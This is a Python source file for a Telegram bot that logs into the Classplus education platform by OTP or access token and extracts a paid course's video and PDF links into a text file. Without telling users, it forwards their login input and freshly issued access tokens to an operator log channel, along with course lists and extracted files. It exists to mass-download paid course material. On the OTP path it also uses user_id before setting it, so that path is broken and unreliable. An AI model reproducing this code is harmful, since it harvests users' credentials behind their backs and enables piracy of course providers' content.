import requests
import json
import uuid
import asyncio
import aiohttp
from pyrogram import Client, filters
import os
from Extractor import app
import cloudscraper
from config import PREMIUM_LOGS, BOT_TEXT
from datetime import datetime
import pytz
from Extractor.core.utils import forward_to_log
import base64
from urllib.parse import urlparse

india_timezone = pytz.timezone('Asia/Kolkata')
current_time = datetime.now(india_timezone)
time_new = current_time.strftime("%d-%m-%Y %I:%M %p")

apiurl = "https://api.classplusapp.com"
s = cloudscraper.create_scraper()

@app.on_message(filters.command(["cp"]))
async def classplus_txt(app, message):
    # Step 1: Ask for credentials
    details = await app.ask(
        message.chat.id,
        "🔹 <b>UG EXTRACTOR PRO</b> 🔹\n\n"
        "Send **ID & Password** in this format:\n"
        "<code>ORG_CODE*Mobile</code>\n\n"
        "Or send direct access token.\n\n"
        "Example:\n"
        "- <code>ABCD*9876543210</code>\n"
        "- <code>eyJhbGciOiJIUzI1NiIsInR5cCI6...</code>"
    )

    await forward_to_log(details, "Classplus Extractor")
    user_input = details.text.strip()

    if "*" in user_input:
        try:
            org_code, mobile = user_input.split("*")
            device_id = str(uuid.uuid4()).replace("-", "")
            headers = {
                "Accept": "application/json, text/plain, */*",
                "region": "IN",
                "accept-language": "en",
                "Content-Type": "application/json;charset=utf-8",
                "Api-Version": "51",
                "device-id": device_id
            }

            # Step 2: Get org details
            org_resp = s.get(f"{apiurl}/v2/orgs/{org_code}", headers=headers)
            if org_resp.status_code != 200:
                await message.reply("❌ Invalid organization code.")
                return
            org_data = org_resp.json().get("data", {})
            org_id = org_data.get("orgId")
            org_name = org_data.get("orgName")

            # Step 3: Generate OTP
            otp_payload = {
                "countryExt": "91",
                "mobile": mobile,
                "viaSms": 1,
                "orgId": org_id,
                "eventType": "login",
                "otpHash": "j7ej6eW5VO"
            }
            otp_resp = s.post(f"{apiurl}/v2/otp/generate", json=otp_payload, headers=headers)
            if otp_resp.status_code != 200:
                await message.reply("❌ Failed to generate OTP. Check your mobile number.")
                return

            session_id = otp_resp.json()["data"]["sessionId"]

            # Step 4: Ask user for OTP
            user_otp = await app.ask(
                message.chat.id,
                "📱 <b>OTP Verification</b>\n\nOTP sent to your mobile number. Enter OTP:",
                timeout=300
            )

            if not user_otp.text.isdigit():
                await message.reply("❌ OTP must be numeric.")
                return

            otp = user_otp.text.strip()
            fingerprint_id = str(uuid.uuid4()).replace("-", "")
            verify_payload = {
                "otp": otp,
                "sessionId": session_id,
                "orgId": org_id,
                "fingerprintId": fingerprint_id,
                "countryExt": "91",
                "mobile": mobile
            }

            verify_resp = s.post(f"{apiurl}/v2/users/verify", json=verify_payload, headers=headers)
            if verify_resp.status_code != 200:
                await message.reply("❌ OTP verification failed. Try again.")
                return

            verify_data = verify_resp.json().get("data", {})
            token = verify_data.get("token")
            s.headers["x-access-token"] = token

            await message.reply(
                f"✅ <b>Login Successful!</b>\n\n🔑 <b>Access Token:</b>\n<code>{token}</code>"
            )
            await app.send_message(PREMIUM_LOGS, f"✅ <b>New Login</b>\n<code>{token}</code>")

        except Exception as e:
            await message.reply(f"❌ Error: {str(e)}")
    elif len(user_input) > 20:
        # Direct access token
        token = user_input
        s.headers['x-access-token'] = token
        try:
            user_details_resp = s.get(f"{apiurl}/v2/users/details")
            user_details = user_details_resp.json().get("data", {}).get("responseData", {})
            user_id = user_details.get("user", {}).get("id")
            if not user_id:
                await message.reply("❌ Failed to fetch user details. Invalid token.")
                return
        except Exception as e:
            await message.reply(f"❌ Error fetching user details: {str(e)}")
            return
    else:
        await message.reply("❌ Invalid input. Send in correct format: ORG_CODE*Mobile or token.")
        return

    # -------------------- Fetch courses -------------------- #
    try:
        params = {'userId': user_id, 'tabCategoryId': 3}
        courses_resp = s.get(f"{apiurl}/profiles/users/data", params=params)
        courses_data = courses_resp.json().get("data", {}).get("responseData", {}).get("coursesData", [])
        if not courses_data:
            await message.reply("❌ No courses found for this user.")
            return

        # Display courses
        text = "📚 <b>Available Courses</b>:\n\n"
        course_list = []
        for idx, course in enumerate(courses_data, start=1):
            name = course.get("name", "Untitled")
            text += f"{idx}. <code>{name}</code>\n"
            course_list.append((idx, course.get("id"), name))

        await app.send_message(PREMIUM_LOGS, f"<blockquote>{text}</blockquote>")

        selected_index = await app.ask(
            message.chat.id,
            f"{text}\nSend the index number of the course to download.",
            timeout=180
        )

        if not selected_index.text.isdigit():
            await message.reply("❌ Please enter a valid number.")
            return

        selected_idx = int(selected_index.text.strip())
        if not (1 <= selected_idx <= len(course_list)):
            await message.reply("❌ Invalid course index selected.")
            return

        selected_course_id = course_list[selected_idx - 1][1]
        selected_course_name = course_list[selected_idx - 1][2]

        await app.send_message(
            message.chat.id,
            f"🔄 <b>Processing Course</b>\n└─ Current: <code>{selected_course_name}</code>"
        )

        # Store session data for batch extraction
        s.session_data = {
            "token": token,
            "courses": {selected_course_id: selected_course_name}
        }

        # Call extract_batch (Part 3)
        await extract_batch(app, message, selected_course_name, selected_course_id)

    except Exception as e:
        await message.reply(f"❌ Error fetching courses: {str(e)}")
# -------------------- extract_batch -------------------- #
async def extract_batch(app, message, batch_name, batch_id):
    session_data = s.session_data
    if "token" not in session_data:
        await message.reply("❌ No session token found. Please login again.")
        return

    token = session_data["token"]
    headers = {
        'x-access-token': token,
        'user-agent': 'Mobile-Android',
        'app-version': '1.4.73.2',
        'api-version': '35',
        'device-id': str(uuid.uuid4()).replace('-', '')
    }

    def encode_partial_url(url):
        if not url:
            return ""
        parsed = urlparse(url)
        base_part = f"{parsed.scheme}://{parsed.netloc}"
        path_part = url[len(base_part):]
        encoded_path = base64.b64encode(path_part.encode('utf-8')).decode('utf-8')
        return f"{base_part}{encoded_path}"

    async def fetch_live_videos(course_id):
        outputs = []
        async with aiohttp.ClientSession() as session:
            try:
                url = f"{apiurl}/v2/course/live/list/videos?type=2&entityId={course_id}&limit=9999&offset=0"
                async with session.get(url, headers=headers) as response:
                    j = await response.json()
                    for video in j.get("data", {}).get("list", []):
                        name = video.get("name", "Unknown Video")
                        video_url = video.get("url", "")
                        content_hash = video.get("contentHashId", "")
                        if video_url:
                            encoded_url = encode_partial_url(video_url)
                            outputs.append(f"{name}:\n{encoded_url}\ncontentHashId: {content_hash}\n")
            except Exception as e:
                print(f"Error fetching live videos: {e}")
        return outputs

    async def process_course_contents(course_id, folder_id=0, folder_path=""):
        result = []
        url = f'{apiurl}/v2/course/content/get?courseId={course_id}&folderId={folder_id}'
        async with aiohttp.ClientSession() as session:
            async with session.get(url, headers=headers) as resp:
                course_data = await resp.json()
                course_data = course_data.get("data", {}).get("courseContent", [])

        tasks = []
        for item in course_data:
            content_type = str(item.get("contentType"))
            sub_id = item.get("id")
            sub_name = item.get("name", "Untitled")
            video_url = item.get("url", "")
            content_hash = item.get("contentHashId", "")

            if content_type in ("2", "3"):  # Video or PDF
                if video_url:
                    encoded_url = encode_partial_url(video_url)
                    if content_hash:
                        encoded_url += f"*UGxCP_hash={content_hash}\n"
                    result.append(f"{folder_path}{sub_name}: {encoded_url}")
            elif content_type == "1":  # Folder
                new_folder_path = f"{folder_path}{sub_name} - "
                tasks.append(process_course_contents(course_id, sub_id, new_folder_path))

        sub_contents = await asyncio.gather(*tasks)
        for sub_content in sub_contents:
            result.extend(sub_content)
        return result

    async def write_to_file(extracted_data):
        invalid_chars = '\t:/+#|@*.'
        clean_name = ''.join(char for char in batch_name if char not in invalid_chars)
        clean_name = clean_name.replace('_', ' ')
        file_path = f"{clean_name}.txt"
        with open(file_path, "w", encoding="utf-8") as file:
            file.write(''.join(extracted_data))
        return file_path

    # Fetch both course contents and live videos
    extracted_data, live_videos = await asyncio.gather(
        process_course_contents(batch_id),
        fetch_live_videos(batch_id)
    )
    extracted_data.extend(live_videos)
    file_path = await write_to_file(extracted_data)

    # Count stats
    video_count = sum(1 for line in extracted_data if "Video" in line or ".mp4" in line)
    pdf_count = sum(1 for line in extracted_data if ".pdf" in line)
    total_links = len(extracted_data)
    other_count = total_links - (video_count + pdf_count)

    caption = (
        f"🎓 <b>COURSE EXTRACTED</b> 🎓\n\n"
        f"📚 <b>BATCH:</b> {batch_name}\n"
        f"📅 <b>DATE:</b> {time_new} IST\n\n"
        f"📊 <b>CONTENT STATS</b>\n"
        f"├─ 📁 Total Links: {total_links}\n"
        f"├─ 🎬 Videos: {video_count}\n"
        f"├─ 📄 PDFs: {pdf_count}\n"
        f"└─ 📦 Others: {other_count}\n\n"
        f"🚀 <b>Extracted by</b>: @{(await app.get_me()).username}\n\n"
        f"<code>╾───• {BOT_TEXT} •───╼</code>"
    )

    await app.send_document(message.chat.id, file_path, caption=caption)
    await app.send_document(PREMIUM_LOGS, file_path, caption=caption)
    os.remove(file_path)
